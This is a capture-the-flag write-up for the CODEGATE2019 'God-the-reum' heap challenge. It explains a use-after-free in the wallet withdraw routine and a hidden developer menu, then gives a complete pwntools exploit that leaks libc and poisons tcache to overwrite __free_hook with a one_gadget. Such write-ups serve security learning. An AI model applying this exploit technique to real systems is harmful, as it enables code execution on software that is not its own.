# CODEGATE2019 God-the-reum

```
[*] '/mnt/hgfs/Shared/god-the-reum'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Binary uses glibc 2.27
Binary has a structure below.

```
struct wallet {
  void *addr;
  void *size;
}
```

Below is menu.

```
====== Ethereum wallet service ========
1. Create new wallet
2. Deposit eth
3. Withdraw eth
4. Show all wallets
5. exit
select your choice : 
```

First menu makes a wallet, which is malloc. The addr pointer is allocated by `malloc(0x82)`, and program get input of initial balance of new wallet. Interesting point is that input value is the size of newly allocated chunk and also the data in allocated chunk. That is,

```
printf("how much initial eth? : ", 0LL);
__isoc99_scanf("%llu", &size);
wallet_addr->size = malloc(size);
if ( wallet_addr->size )
  *wallet_addr->size = size;
```

therefore we can freely make chunks that have arbitrary size.

Other menu has nothing special, but in withdraw menu is the size pointer freed if balance after withdraw is zero.
but there's no initializing NULL procedure which means UAF vulnerability.

```
void __cdecl Withdraw_eth(wallet *a1)
{
  __int64 v1; // [rsp+10h] [rbp-10h]
  unsigned __int64 v2; // [rsp+18h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  printf("how much you wanna withdraw? : ");
  __isoc99_scanf("%llu", &v1);
  *a1->size -= v1;
  if ( !*a1->size )
    free(a1->size);
  puts("withdraw ok !\n");
}
```

There's a hidden menu, developer.
```
void __cdecl developer(wallet *a1)
{
  dummy();
  puts("this menu is only for developer");
  puts("if you are not developer, please get out");
  sleep(1u);
  printf("new eth : ");
  __isoc99_scanf("%10s", a1->size);
}
```

In fact, we can write arbitrary data with deposit menu. but while deposit menu get input type of number,
 developer menu gets string. It makes more easy to write exploit codes.

Exploit scenario is

1. 적당히 큰 chunk를 할당 후 해제(libc leak)
2. tcache에 들어갈 정도의 chunk 할당 후 해제
3. fd pointer overwrite를 해서 이후 malloc에서 __free_hook을 할당 받음
4. __free_hook에 one_gadget의 주소를 overwrite
5. free 호출

```
from pwn import *


def sla(x, y): return p.sendlineafter(x, y)


def ru(x): return p.recvuntil(x)


def create(size):
    sla('choice : ', str(1))
    sla('eth? : ', str(size))


def deposit(idx, amount):
    sla('choice : ', str(2))
    sla('no : ', str(idx))
    sla('deposit? : ', str(amount))


def withdraw(idx, amount):
    sla('choice : ', str(3))
    sla('no : ', str(idx))
    sla('withdraw? : ', str(amount))


def show():
    sla('choice : ', str(4))


def developer(idx, data):
    sla('choice : ', str(6))
    sla('no : ', str(idx))
    sla('new eth : ', data)


p = process('./god-the-reum', env={'LD_PRELOAD': './libc-2.27.so'})
bin = ELF('./god-the-reum')
libc = ELF('./libc-2.27.so')

free_hook_offset = 0x3ed8e8
one_gadget_offset = 0x4f322  # 0x4f2c5 0x4f322 0x10a38c

# gdb.attach(p, '')

# libc leak
create(0x1000)  # 1
create(0x10)    # 2
withdraw(0, 0x1000)
show()
ru('ballance ')
libc_addr = int(ru('\n')[:-1]) - 0x3ebca0
log.info('Libc Addr: ' + hex(libc_addr))

# tcache
withdraw(1, 0x10)
developer(1, p64(libc_addr + free_hook_offset))
create(0x10)    # 3
create(0x10)    # 4
developer(3, p64(libc_addr + one_gadget_offset))
withdraw(2, 0x10)

p.interactive()
```

